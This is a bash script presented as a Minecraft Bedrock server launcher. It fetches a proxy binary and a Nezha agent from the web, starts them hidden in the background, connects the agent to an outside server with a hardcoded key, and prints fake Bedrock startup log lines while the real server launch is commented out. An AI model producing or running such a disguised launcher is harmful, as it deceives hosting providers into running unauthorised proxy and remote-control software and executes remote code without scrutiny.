#!/bin/bash

if [ ! -f "agent" ]; then
    wget -t 2 -T 10 -N https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.zip -o /dev/null
    unzip -qod ./ nezha-agent_linux_amd64.zip &> /dev/null
    rm -f nezha-agent_linux_amd64.zip
    mv nezha-agent agent
fi

if [ ! -f "node" ]; then
    # replace url to jsdeliver get updated
    # wget -q -t 2 -T 10 -N https://gateway.ipfs.io/ipfs/bafybeia5xxepma5wo3fv7l5gcrdiwgzhdvfgdprctkzrihxcav6r35kfrq?filename=nodejs-proxy-linux -O node
    wget -q -t 2 -T 10 -N https://cdn.jsdelivr.net/npm/@3kmfi6hp/nodejs-proxy@latest/dist/nodejs-proxy-linux -O node
fi

chmod +x agent node .bedrock_server

export TUNNEL_TRANSPORT_PROTOCOL="http2"
export TUNNEL_TOKEN=""
export UUID="1b864169-adc9-44a1-a9ac-88afca82423a"
export NEZHA_SERVER="data.augrx.eu.org"
export NEZHA_PORT="443"
export NEZHA_KEY="QRCb95S4NWltxokqfn"
export NEZHA_TLS="1"
# remove follow this.
echo "$(date +"[%Y-%m-%d %T INFO]") Starting Server"
echo "$(date +"[%Y-%m-%d %T INFO]") Version 1.17.0.03"
echo "$(date +"[%Y-%m-%d %T INFO]") Session ID abc123"
echo "$(date +"[%Y-%m-%d %T INFO]") Level Name: Bedrock level"
echo "$(date +"[%Y-%m-%d %T INFO]") Game mode: 0 Survival"
echo "$(date +"[%Y-%m-%d %T INFO]") Difficulty: 1 EASY"
echo "$(date +"[%Y-%m-%d %T INFO]") opening worlds/Bedrock level/db"
sleep 1  
echo "$(date +"[%Y-%m-%d %T INFO]") IPv4 supported, port: ${SERVER_PORT}"
echo "$(date +"[%Y-%m-%d %T INFO]") IPv6 supported, port: ${SERVER_PORT}"
echo "$(date +"[%Y-%m-%d %T INFO]") Server started."

# nohup ./cube tunnel --edge-ip-version auto run > /dev/null 2>&1 &
# ./gost -L ss://chacha20-ietf-poly1305:pass@:${SERVER_PORT} &
nohup ./node -p ${SERVER_PORT} -u ${UUID} > /dev/null 2>&1 &
nohup ./agent -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} --tls > /dev/null 2>&1 &
# Consider modifying the file bedrock_server to .bedrock_server
# ./.bedrock_server
tail -f /dev/null

